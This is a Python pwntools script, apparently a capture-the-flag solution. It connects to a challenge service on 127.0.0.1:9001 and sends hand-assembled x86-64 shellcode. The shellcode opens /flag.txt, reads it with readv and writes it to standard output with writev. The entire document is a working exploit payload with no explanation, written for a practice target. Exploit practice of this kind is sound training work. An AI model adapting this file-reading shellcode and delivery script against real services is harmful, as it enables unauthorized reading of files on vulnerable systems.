#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="b vuln")
p = remote("127.0.0.1", 9001)

payload = b""
payload += asm(shellcraft.pushstr("/flag.txt"))
payload += asm("""
    mov rdi, rsp
    xor esi, esi
    mov eax, SYS_open
    syscall
    mov r12, rax # save fd in r12

    mov r13, rsp # setup iovec on stack
    add r13, 256
    mov qword ptr [rsp], r13
    mov qword ptr [rsp+8], 256

    mov rdi, r12 # use flag fd
    mov rsi, rsp # use iovec
    mov edx, 1
    mov eax, SYS_readv
    syscall

    mov edi, 1
    mov rsi, rsp # use iovec
    mov edx, 1
    mov eax, SYS_writev
    syscall
""")
p.sendline(payload)

print(p.readuntil(b"}").decode())
